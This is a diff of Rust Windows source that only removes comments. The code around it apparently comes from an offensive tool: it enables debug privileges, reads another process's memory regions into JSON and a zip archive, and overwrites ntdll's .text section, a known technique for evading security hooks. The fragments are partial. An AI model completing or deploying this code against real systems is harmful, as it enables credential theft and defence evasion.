@@ -102,14 +102,14 @@ fn enable_debug_privileges() -> Result<(), String> {
         );
 
         if !NT_SUCCESS(status) {
-            CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
+            CloseHandle(token_handle as *mut winapi::ctypes::c_void);
             return Err(format!(
                 "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{:08X}",
                 status
             ));
         }
 
-        CloseHandle(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
+        CloseHandle(token_handle as *mut winapi::ctypes::c_void);
         println!("[+] Debug privileges enabled successfully.");
         Ok(())
     }
@@ -258,12 +258,11 @@ unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
         let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
         let mut return_size: usize = 0;
 
-        // If you defined the enum manually (Option 1 from previous answer):
         let ntstatus = unsafe {
             NtQueryVirtualMemory(
                 h_process,
                 mem_address,
-                MemoryInformationClass::MemoryBasicInformation,  // Use enum variant instead of 0
+                MemoryInformationClass::MemoryBasicInformation,
                 &mut mbi as *mut _ as PVOID,
                 std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                 &mut return_size,
@@ -292,12 +291,9 @@ unsafe fn barrel(json_file: &str, zip_file: &str) -> Result<(), String> {
                 )
             };
 
-            // println!("{}", status);
             if status != 0 && status != 0x8000000Du32 as i32 { // 0x8000000D = Partial copy
                 println!("NtReadVirtualMemory failed with status: 0x{:X}", status);
             }
-
-            // let fname = format!("{:x}", mbi.BaseAddress as usize);
 
             let json_item = format!(
                 "{{\"field0\":\"{:p}\", \"field1\":\"{:p}\", \"field2\":{}}}, ",
@@ -405,7 +401,7 @@ unsafe fn get_module_address(dll_name: &str) -> Option<PVOID> {
 
 
 pub unsafe fn get_text_section_info(ntdll_address: *mut u8) -> Option<TextSectionInfo> {
-    let h_process = -1isize as HANDLE; // pseudo handle
+    let h_process = -1isize as HANDLE;
     let mut bytes_read = 0;
 
     // Check MZ Signature (2 bytes)
@@ -619,7 +615,7 @@ pub unsafe fn replace_ntdll_txt_section(
     local_ntdll_txt: *mut u8,
     local_ntdll_txt_size: u32,
 ) {
-    let current_process = -1isize as HANDLE; // pseudo handle
+    let current_process = -1isize as HANDLE;
     let mut region_size: SIZE_T = local_ntdll_txt_size as SIZE_T;
     let mut base_address: *mut c_void = local_ntdll_txt as *mut c_void;
     let mut old_protection: ULONG = 0;
